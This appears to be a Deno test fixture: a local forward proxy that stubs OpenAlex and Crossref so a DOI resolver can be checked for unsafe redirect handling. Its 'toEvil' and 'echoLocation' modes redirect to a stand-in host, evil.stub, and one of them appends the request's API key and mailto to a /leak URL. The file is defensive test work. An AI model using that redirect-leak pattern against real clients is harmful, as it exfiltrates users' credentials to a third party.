// An in-process forward proxy + stub OpenAlex/Crossref for the resolver's tests (rw-p6a-resolve
// attempt 2). Listens on 127.0.0.1 only; the resolver under test reaches it through a REAL
// Deno.createHttpClient({ proxy }) - so what is tested is Deno's own fetch, redirects and all.
// Every request that reaches it is logged (host, path, query, user-agent); any host is accepted,
// so a followed redirect to a third host is SEEN here rather than failing somewhere else.
//
// Modes (the tester's attempt-1 shapes, adv-log-mode-*.json):
//   ok            OpenAlex 200 for every work
//   crToOA        OpenAlex 404; Crossref 302 -> http://api.openalex.stub/works/doi:<doi> (no key)
//   oaToCR        OpenAlex 302 -> http://api.crossref.stub/works/<doi> (no mailto)
//   toEvil        OpenAlex 302 -> http://evil.stub/works/<doi>
//   echoLocation  OpenAlex 302 -> http://evil.stub/leak?<the request's own query: key + mailto>
//   title200      OpenAlex 200 whose title echoes the request's query (key + mailto)
export interface Logged { host: string; path: string; query: Record<string, string>; ua: string | null }

export type ProxyMode = "ok" | "crToOA" | "oaToCR" | "toEvil" | "echoLocation" | "title200";

export function startProxy(mode: ProxyMode) {
  const log: Logged[] = [];
  const ac = new AbortController();
  const server = Deno.serve({ hostname: "127.0.0.1", port: 0, signal: ac.signal, onListen: () => {} }, async (req) => {
    const u = new URL(req.url);
    const host = u.hostname;
    await req.body?.cancel();
    log.push({ host, path: decodeURIComponent(u.pathname), query: Object.fromEntries(u.searchParams), ua: req.headers.get("user-agent") });
    const work = decodeURIComponent(u.pathname).replace(/^\/works\//, "");
    const doi = work.replace(/^doi:/, "");
    const redirect = (to: string) => new Response(null, { status: 302, headers: { location: to } });
    if (host === "api.openalex.stub") {
      if (mode === "oaToCR") return redirect(`http://api.crossref.stub/works/${doi}`);
      if (mode === "toEvil") return redirect(`http://evil.stub/works/${doi}`);
      if (mode === "echoLocation") return redirect(`http://evil.stub/leak?${u.searchParams}`);
      if (mode === "crToOA") return Response.json({ error: "not found" }, { status: 404 });
      const title = mode === "title200" ? `Echo title ${[...u.searchParams].map(([k, v]) => `${k}=${v}`).join(" ")}` : `Proxy title ${doi}`;
      return Response.json({ title, type: "article", doi: `https://doi.org/${doi}`, publication_date: "2021-02-01" });
    }
    if (host === "api.crossref.stub") {
      if (mode === "crToOA") return redirect(`http://api.openalex.stub/works/doi:${doi}`);
      return Response.json({ message: { title: [`CR title ${doi}`], type: "journal-article", DOI: doi } });
    }
    return Response.json({ title: "evil", type: "article" }); // a third host: answered, so a follow is visible
  });
  const addr = server.addr as Deno.NetAddr;
  return {
    url: `http://127.0.0.1:${addr.port}`,
    log,
    async close() {
      ac.abort();
      await server.finished;
    },
  };
}
